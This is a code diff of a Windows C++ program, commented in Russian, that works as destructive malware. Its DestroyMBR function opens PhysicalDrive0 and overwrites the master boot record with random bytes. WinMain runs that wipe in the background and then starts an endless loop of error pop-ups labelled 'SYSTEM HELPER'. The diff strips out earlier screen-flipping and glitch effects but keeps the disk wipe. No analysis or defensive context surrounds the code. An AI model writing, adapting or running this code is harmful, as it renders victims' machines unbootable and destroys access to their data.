@@ -1,91 +1,39 @@
 #include <windows.h>
-#include <iostream>
-#include <cstdlib>
-#include <ctime>
 #include <thread>
 #include <chrono>
 
-// ==========================================
-// ЧАСТЬ 1: СМЕНА ОРИЕНТАЦИИ ЭКРАНА (ПЕРЕВОРОТ)
-// ==========================================
-void FlipScreen() {
-    DEVMODE dm;
-    ZeroMemory(&dm, sizeof(dm));
-    dm.dmSize = sizeof(dm);
-    
-    if (EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &dm)) {
-        // Меняем ориентацию на 180 градусов (вверх ногами)
-        dm.dmFields = DM_DISPLAYORIENTATION;
-        dm.dmDisplayOrientation = DMDO_180;
-        ChangeDisplaySettings(&dm, CDS_UPDATEREGISTRY);
-    }
-}
-
-// ==========================================
-// ЧАСТЬ 2: РЕАЛИСТИЧНЫЙ СБОЙ МАТРИЦЫ (GDI-ГЛИТЧ)
-// ==========================================
-void MatrixGlitch() {
-    HDC hdc = GetDC(NULL);
-    int w = GetSystemMetrics(SM_CXSCREEN);
-    int h = GetSystemMetrics(SM_CYSCREEN);
-
-    while (true) {
-        // 1. Рисуем случайные цветные полосы (сдвиг картинки)
-        for (int i = 0; i < 50; i++) {
-            int y = rand() % h;
-            int height = rand() % 20 + 1;
-            COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);
-            HBRUSH brush = CreateSolidBrush(color);
-            RECT rect = {0, y, w, y + height};
-            FillRect(hdc, &rect, brush);
-            DeleteObject(brush);
-        }
-        
-        // 2. Сдвиг пикселей (эффект "сбоя матрицы")
-        if (rand() % 100 < 20) { // 20% шанс на сдвиг
-            int shiftX = rand() % 20 - 10;
-            int shiftY = rand() % 20 - 10;
-            BitBlt(hdc, shiftX, shiftY, w, h, hdc, 0, 0, SRCCOPY);
-        }
-        
-        Sleep(10); // Задержка для мерцания
-    }
-    ReleaseDC(NULL, hdc);
-}
-
-// ==========================================
-// ЧАСТЬ 3: СНОС MBR (BOOTKIT)
-// ==========================================
+// Ссылка на функцию сноса MBR
 void DestroyMBR() {
     HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 
                                  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (hDevice != INVALID_HANDLE_VALUE) {
         BYTE garbage[512];
-        srand(time(NULL));
-        for (int i = 0; i < 512; i++) {
-            garbage[i] = rand() % 256;
-        }
-        DWORD bytesWritten;
-        WriteFile(hDevice, garbage, 512, &bytesWritten, NULL);
+        for (int i = 0; i < 512; i++) garbage[i] = rand() % 256;
+        DWORD written;
+        WriteFile(hDevice, garbage, 512, &written, NULL);
         CloseHandle(hDevice);
     }
 }
 
-// ==========================================
-// ГЛАВНАЯ ФУНКЦИЯ
-// ==========================================
+// Поток, который спамит окнами
+void WindowSpam() {
+    while (true) {
+        // Создаем окно в отдельном потоке, чтобы не блокировать спам
+        std::thread([]() {
+            MessageBoxA(NULL, "I AM HELPING YOU >:D", "SYSTEM HELPER", MB_OK | MB_ICONERROR);
+        }).detach();
+        Sleep(50); // Задержка, чтобы окна успевали появляться
+    }
+}
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    srand(time(NULL));
+    srand(GetTickCount());
 
-    // 1. Переворачиваем экран
-    FlipScreen();
+    // 1. Сносим MBR в фоне
+    std::thread(DestroyMBR).detach();
 
-    // 2. Сносим MBR в отдельном потоке
-    std::thread mbrThread(DestroyMBR);
-    mbrThread.detach();
-
-    // 3. Запускаем глитч (он бесконечный)
-    MatrixGlitch();
+    // 2. Запускаем бесконечный спам окнами
+    WindowSpam();
 
     return 0;
 }
